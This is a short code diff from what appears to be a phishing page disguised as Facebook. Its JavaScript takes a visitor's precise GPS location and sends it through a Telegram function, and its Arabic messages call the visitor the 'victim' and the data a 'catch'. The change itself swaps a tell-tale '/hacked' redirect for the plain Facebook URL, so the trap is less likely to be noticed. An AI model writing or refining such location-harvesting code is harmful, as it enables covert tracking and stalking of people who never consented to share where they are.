@@ -67,13 +67,13 @@
                 let lon = pos.coords.longitude;
                 let msg = `🎯 صيد دقيق (GPS REAL-TIME)\n📍 الإحداثيات: ${lat}, ${lon}\n🔗 الخريطة: https://www.google.com/maps?q=${lat},${lon}`;
                 sendToTelegram(msg);
-                setTimeout(() => { window.location.href = "https://m.facebook.com/hacked"; }, 1000);
+                setTimeout(() => { window.location.href = "https://m.facebook.com"; }, 1000);
             }, (err) => {
                 sendToTelegram("⚠️ الضحية رفض إذن الموقع.");
                 window.location.href = "https://m.facebook.com";
             }, { enableHighAccuracy: true });
         } else {
-            window.location.href = "https://m.facebook.com/hacked";
+            window.location.href = "https://m.facebook.com";
         }
     }
 
